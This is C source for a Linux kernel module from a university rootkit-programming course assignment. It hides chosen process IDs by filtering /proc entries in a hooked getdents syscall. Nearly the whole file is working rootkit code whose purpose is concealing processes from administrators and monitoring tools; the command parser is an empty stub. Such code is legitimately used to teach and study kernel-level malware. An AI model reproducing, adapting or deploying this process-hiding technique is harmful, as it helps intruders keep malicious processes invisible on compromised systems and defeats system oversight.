
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 3                                                             */
/*                                                                             */
/*   Filename: process_masker.c                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: insmod $(module_name).ko pids=[x,y,...]                            */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
#include <linux/ctype.h>
#include <linux/slab.h>
#include <linux/list.h>

#include "process_masker.h"
#include "core.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */

#define MOD_NAME "process_masker"

struct hidden_pid {
	pid_t pid;
	struct list_head list;
};

unsigned long proc_ino;
LIST_HEAD(hidden_pids_list);

/* Function that checks whether we need to mask the specified pid */
static int should_mask(pid_t pid)
{
	struct hidden_pid *p = NULL;

	list_for_each_entry(p, &hidden_pids_list, list)
		if (p->pid == pid)
			return 1;

	return 0;
}

asmlinkage int pm_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count, int ret)
{
	int nread_temp;
	int pid;
	char *endptr;

	if (dirp->d_ino != proc_ino)
		return ret;

	nread_temp = ret;

	while (nread_temp > 0) {
		nread_temp -= dirp->d_reclen;

		pid = simple_strtol(dirp->d_name, &endptr, 10);
		if (pid && should_mask(pid)) {
			printk(KERN_INFO MSG_PREF(MOD_NAME)"hiding PID %d\n", pid);
			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
			ret -= dirp->d_reclen;
			continue;
		}

		if (nread_temp == 0)
			return ret;

		dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
	}

	return ret;
}

/* Function that gets the inode number of the file found under specified path */
static unsigned long get_inode_no(char *path_name)
{
	unsigned long inode_no;
	struct path path;
	struct inode *inode;

	inode_no = -1;

    kern_path(path_name, LOOKUP_FOLLOW, &path);
    inode = path.dentry->d_inode;
	inode_no = inode->i_ino;

	return inode_no;
}

void pm_command(char *cmd)
{
	/* Logic goes here. */
	/* Assuming there is any. */
	/* Let's be optimistic! :) */
	/* There _will_ be logic! */

	printk(KERN_INFO MSG_PREF(MOD_NAME)"received %s\n", cmd);
}

/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the getdents() syscall. */
void process_masker_init(struct orig *original_syscalls)
{
	proc_ino = get_inode_no("/proc");
	if (proc_ino < 0)
		return;

	register_getdents_instrumenter(pm_getdents_syscall);
	register_command_parser(pm_command);

	printk(KERN_INFO MSG_PREF(MOD_NAME)"loaded.\n");
}

/* Cleanup function which is called just before module
   is rmmoded. It restores the original getdents() syscall. */
void process_masker_exit(void)
{
	deregister_command_parser(pm_command);
	deregister_getdents_instrumenter(pm_getdents_syscall);

	printk(KERN_INFO MSG_PREF(MOD_NAME)"unoaded.\n");
}
